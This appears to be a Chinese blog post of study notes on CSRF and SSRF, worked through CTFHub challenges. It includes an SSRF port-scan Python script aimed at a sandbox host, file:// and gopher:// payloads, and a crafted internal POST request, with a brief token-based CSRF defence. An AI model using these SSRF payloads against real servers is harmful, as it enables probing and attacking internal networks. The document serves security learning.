+++
title = "CSRF SSRF"
date = 2022-05-12T10:00:00+08:00
draft = false
description = "CSRF 与 SSRF 的基础概念、利用方式和常见防御思路整理。"
tags = []
+++
![](images/posts/CSRF_SSRF/1659763989665-e2700c42-3e82-4ff7-8c9d-eb69286371a8-cbfc20ec71.png)

用户访问 黑客制作的恶意修改 或添加信息的网页 导致自己的信息被修改 （前提是用户登陆过）

## 防御方案
随机token  数据包唯一值  最有效

![](images/posts/CSRF_SSRF/1659764785045-af3b9ed4-4769-4089-a3cb-922513187e88-78f285991f.png)

## SSRF

![](images/posts/CSRF_SSRF/1659765936121-2f4cc0c2-bace-4fd8-a120-1d998615d8fa-e4d5d5223a.png)

1. 原理

---通过外网访问服务器（不能直接访问内网），进而获取到服务区所连接的内网的服务器的一些信息。

---可以对内网进行一些信息收集

2.可以作为探针 通过服务器请求内网主机进行内网系统攻击

![](images/posts/CSRF_SSRF/1659765199380-8f98b52a-ab41-4f4f-bf7b-326376af53b7-f60a17fa2b.png)

不同代码的协议请求不同

![](images/posts/CSRF_SSRF/1659766123078-7035c0e9-6694-48fe-8079-da4fd70ef637-190a4dc90f.png)

## 伪协议读取文件

![](images/posts/CSRF_SSRF/1663401219100-86830426-5a0a-4671-b9ad-fd82b5cc2b56-113f97411d.png)

![](images/posts/CSRF_SSRF/1663401615535-1777e1b0-2b28-4c1a-b0bd-5bea8c69469c-d07869b020.png)

## 看源码即可

## 端口扫描

![](images/posts/CSRF_SSRF/1663402023131-627ca5c7-3fec-4043-be1a-ab1177e5ea10-c84e68e7a3.png)

```python
import requests
import time

url = "http://challenge-300ea3e3e7f53c1b.sandbox.ctfhub.com:10800/ url="
data = "127.0.0.1:"
for i in range(8000,9001):
urls = url + data + str(i)
print(urls)
response = requests.get(urls) and time.sleep(1)
if response.status_code == 200:
print(response.text)
```

![](images/posts/CSRF_SSRF/1663571652464-458f86aa-cd84-4e15-b2b7-934dfe315eb6-df28b29c5f.png)

## POST请求
Gopher协议是一种信息查找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。

2.它只支持文本，不支持图像

3.Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。

![](images/posts/CSRF_SSRF/1663402292018-c17148fc-42b6-4d93-8482-da0c87d502d9-35b961ccb2.png)

## 用 file协议读取index的内容发现

![](images/posts/CSRF_SSRF/1663852903395-5170afb5-b043-480e-937a-0761e2eba92d-f8d80711ce.png)

```php

```

## file协议读取flag文件

![](images/posts/CSRF_SSRF/1663853026877-a1b70220-4d51-4543-81bf-06bf88b018a0-79280995e9.png)

## 代码可知传入key的值并且本地访问。

```php

```

访问127.0.0.1/flag.php 发现key的值


![](images/posts/CSRF_SSRF/1663853623572-3b64ed55-dec2-4290-97c1-92e7550a5ff1-11da433a49.png)

构造payload数据包

```php
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=3b05553ef9bee5c9ec4652c2a1419719
```

**进行URL编码 编码三次 （编码次数取决于解码几次）****且第一次编码后%0A需全部替换成%0D%0A**

![](images/posts/CSRF_SSRF/1663855005136-31ece764-8fc8-49f3-8b83-e2c990552b62-856224cea7.png)

```php
payload:  url=http://127.0.0.1:80/index.php url=gopher://127.0.0.1:8080_URL编码后的
```

![](images/posts/CSRF_SSRF/1663855016631-198f09a4-8628-4b81-a3d7-a1a1c2ce16ad-fe8fe376aa.png)

## redis 和fastcgi协议都是用gopherus 打的原理不是很理解

[https://blog.csdn.net/mysteryflower/article/details/94386461](https://blog.csdn.net/mysteryflower/article/details/94386461) fastcgi 看不太懂
